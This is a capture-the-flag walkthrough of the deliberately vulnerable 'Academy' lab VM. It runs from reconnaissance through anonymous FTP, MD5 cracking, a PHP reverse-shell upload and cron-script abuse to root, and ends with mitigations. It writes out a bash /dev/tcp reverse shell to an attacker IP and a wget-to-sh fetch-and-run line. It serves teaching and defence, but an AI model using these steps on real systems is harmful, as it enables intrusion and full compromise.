# Academy-CTF-Walkthrough
CyberLab-12


## #Overview

Academy is a vulnerable machine from TCM Security (https://tcm-sec.com/). The objective is to gain root access and capture the flag.  
It involves a chain of vulnerabilities and misconfigurations across different services, which eventually leads to full system compromise.  

**Machine:**  
https://drive.google.com/file/d/1u4628J7AwEzFCS3gWZbJgv-lhGzwmrvf/view?source=post_page-----e891243c61a8-----------------------------------------

**Enviroment:**  

1- Kali Linux (Attacker).  
2- Academy (.ovf) VM.  
3- Make sure that both on the same Virtual network (NAT).  

---

## #Methodology

We will walkthrough each of these following steps one by one:

Reconnaissance → Enumeration → Credential Discovery → File Upload (RCE)   → Local Enumeration → Credential Reuse → CronJobs Enumeration → Root Access


---

## 1-Information Gathering (Active Reconnaissance)

**Host Discovery**

```bash
ip a
sudo netdiscover -r 192.168.38.0/24
sudo nmap -sn 192.168.38.0/24
ping 192.168.38.138
```
<img width="1036" height="859" alt="image" src="https://github.com/user-attachments/assets/d04aa7df-7af9-4f4a-96a1-4e3d0708a6fb" />

We can identify Academy IP-Address by netdiscover (Arp Scan) or by Nmap (Ping Sweep), Eventually the IP (192.168.38.138).

**Service & Port Scanning**

```bash
sudo nmap -Pn -sC -sS -sV -p- -T4 192.168.38.138
```

<img width="970" height="863" alt="image" src="https://github.com/user-attachments/assets/a9bfb7f8-31f1-43ce-abe3-a63dcff96cb7" />


Based on the Nmap scan, we found three open ports:

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.9p1 |
| 80   | HTTP    | Apache Httpd 2.4.38 |  

We will investigate each service to identify potential vulnerabilities and possible ways to gain initial access.

---

## 2-Enumeration

The plan is to start by enumerating FTP, as it is one of the easiest services to enumerate when it is not configured correctly and may contain valuable information.  
Then, we will move to the web application on port 80, followed by SSH on port 22.

- **(A) FTP Anonymous User allowed:**

<img width="708" height="94" alt="image" src="https://github.com/user-attachments/assets/4dd86d42-99a0-4ecb-97a5-a0c3d9e1236e" />

 An anonymous FTP account allows users to access an FTP server without providing a valid username and password, which can potentially expose sensitive files.  

 **Username: Anonymous**  
 **Password: Anonymous**  

 ```bash
ftp 192.168.38.138
enter Username & Password
ls
get note.txt
exit
cat note.txt
```

<img width="1269" height="530" alt="image" src="https://github.com/user-attachments/assets/3243763a-aacb-4c8d-b169-9cca6c1cf172" />
<img width="1289" height="442" alt="image" src="https://github.com/user-attachments/assets/3fc83256-cf43-4c1c-ac59-bfa99d010849" />  

- Now we have extracted some valuable information:  
1- Grimmie an Administrator uses the same password which is good if we can find.  
2- Authenticated user ID & Password (Hashed) that we will search where to use them later.  

```bash
Username: 10201321
Password: cd73502828457d15655bbd7a63fb0bc8
```

- Now lets try to crack this password.   

```bash
hash-identifier cd73502828457d15655bbd7a63fb0bc8
hashcat -m  0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt
```


<img width="875" height="435" alt="image" src="https://github.com/user-attachments/assets/c767bab9-e34c-4da6-a516-1adff39757ef" />
<img width="1089" height="940" alt="image" src="https://github.com/user-attachments/assets/cc37677d-aebc-4811-be1e-6c81d673b24e" />


```bash
Username: 10201321
Password: student
```

- We concluded that the hashed password is **MD5** and then cracked it with hashcat.
- We need an endpoint to authenticate this user which of course will be on the WebApp on port 80.
- All of the above concluded an FTP information disclosure that must be configured right.

 
 
  **(B) WebApp & Directory Enumeration:**

We will now visit the Academy web application on port 80. Everything appears to be normal. we will move on to directory enumeration, hoping to find valuable directories or files that could help with exploitation.   

```bash
http://192.168.38.138
```

  <img width="1284" height="720" alt="image" src="https://github.com/user-attachments/assets/53d8fe22-71fe-4f03-9959-4f8286527af5" />  

We will move on to directory enumeration, hoping to find valuable directories or files that could help with exploitation. 

```bash
sudo ffuf -u http://192.168.38.138:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1266" height="918" alt="image" src="https://github.com/user-attachments/assets/1c0e656e-2182-4bfe-8d1d-c6c1b2cefc46" /> 

We found two interesting directories: **phpmyadmin** and **academy**.
We will now use the credentials we found earlier and try to log in to the **Academy** web application.


<img width="1278" height="735" alt="image" src="https://github.com/user-attachments/assets/386ca65f-9e16-498d-8a9a-8fce068bb14d" />  
<img width="966" height="884" alt="image" src="https://github.com/user-attachments/assets/dfa4515f-2048-47e2-b90d-c563aaa746fd" />

---

## 3-Explotation (Gaining Access):

- Since we found an image upload endpoint, we can test whether the application properly validates uploaded files.  
- We will attempt to upload a reverse shell payload and set up a listener on our Kali machine.
- We will use the pentest monkey reverse shell (https://github.com/pentestmonkey/php-reverse-shell/tree/master), download the code and modify the IP & Port.

  <img width="724" height="296" alt="image" src="https://github.com/user-attachments/assets/d0df1670-1fba-47c3-8814-813982d390c6" />   

```bash
nc -nlvp 4444
````

<img width="457" height="170" alt="image" src="https://github.com/user-attachments/assets/71bc8b7c-c353-4103-a6c8-adca117c2319" />  

- Upload the Code and see if it works

  <img width="607" height="748" alt="image" src="https://github.com/user-attachments/assets/95b24d03-af08-4581-9dc1-c945774522d5" />
  <img width="978" height="300" alt="image" src="https://github.com/user-attachments/assets/fcb9f4eb-2a26-445f-921a-095f7ed24e43" />

  - We gained a shell on the machine with (www-data) user so our goal is to escalate our privilege to root (vertical Escalation).
    

---

## 4-Privilege Escalation (Maintaining Access):

- We will perform **local enumeration using LinPEAS**, a shell script that automates the collection of important system information that can help a penetration tester identify possible privilege-escalation opportunities.

(https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
wget -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```


<img width="1109" height="942" alt="image" src="https://github.com/user-attachments/assets/02cb3701-7ac1-4f60-ab17-04be5f8482a7" />  
  

```bash
chmod +x linpeas.sh
./linpeas.sh
```

<img width="1251" height="921" alt="image" src="https://github.com/user-attachments/assets/0759d4e4-71de-4a56-a1fb-9e7888d22877" />


- We will keep scrolling in this interesting information till we find something useful.

<img width="1277" height="246" alt="image" src="https://github.com/user-attachments/assets/fbcd7008-0d03-42dd-8868-2c1cda83c67d" />  
<img width="1218" height="198" alt="image" src="https://github.com/user-attachments/assets/37f2052b-8ca2-4edf-a35c-4f996c1f6b4e" />
<img width="1300" height="173" alt="image" src="https://github.com/user-attachments/assets/dcb162ac-d5c2-44b4-8108-f087f9cb0c78" />



```bash
 grimmie
 My_V3ryS3cur3_P4ss
```


- Now we have a breakthrough. We found a Grimmie user, who is an administrator, along with his password.
- If you remember the note we found earlier, Grimmie mentioned that he uses the same password for all of his accounts. Therefore, we can try to use these credentials to SSH into the machine.
- We also found a CronJob running under Grimmie’s user, which we will investigate as a possible privilege-escalation opportunity.


```bash
ssh grimmie@192.168.38.139
yes
My_V3ryS3cur3_P4ss
ls
cat backup.sh
```

<img width="991" height="610" alt="image" src="https://github.com/user-attachments/assets/1c54dd2c-bc4f-4c9a-af4b-4f80f2a4cc94" />
<img width="844" height="364" alt="image" src="https://github.com/user-attachments/assets/c7dbe673-33bc-4db2-a15c-6a8dd9b7c2ea" />


- Now we found our way to root access on the machine. The script is executed with high privileges, so we can modify its content to execute a reverse shell and set up a listener on the attacker machine. Once the script runs, we should receive a shell with root privileges. (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
nc -nlvp 4444
```



```bash
nano backup.sh
bash -i >& /dev/tcp/192.168.38.130/4444 0>&1
```

<img width="1053" height="584" alt="image" src="https://github.com/user-attachments/assets/39e266cf-73e9-414c-b73b-338b37aa0fb7" />  


---

## #Mitigations

- 1. Information Disclosure via FTP  
Severity: High  
CVSS v3.1: 7.5  
**Impact:** Unauthorized access to application credentials.  
**Remediation:** Remove sensitive files from public locations & Disable anonymous FTP.

---

- 2. Weak Password Storage (MD5)  
Severity: High  
CVSS v3.1: 7.5  
**Remediation:** Implement salting & Enforce strong password policies.

---

- 3. Unrestricted File Upload (RCE)
Severity: Critical  
CVSS v3.1: 9.8  
**Remediation:** Validate file signatures & Store uploads outside the web root.

---

- 4. Credential Reuse
Severity: High  
CVSS v3.1: 8.8  
**Remediation:** Separate application and system credentials.

---
- 5. Plaintext Credentials in Configuration Files  
Severity: Medium  
CVSS v3.1: 6.5  
**Remediation:** Store secrets in environment variables & Restrict file permissions.

---

- 6. Insecure Cron Permissions  
Severity: Critical  
CVSS v3.1: 9.8  
**Remediation:** Audit cron jobs regularly & Monitor integrity of privileged scripts.


---

## #Visual Summarization



---

## #Lessons Learned

* Always enumerate all open services.
* Check for exposed credentials and sensitive information.
* Test file upload functionality for vulnerabilities.
* Always check CronJobs for privilege escalation.
* Avoid reusing passwords between accounts.
* Information disclosure can lead to complete compromise.
* Configuration files frequently expose credentials.
* Implement least privilege.

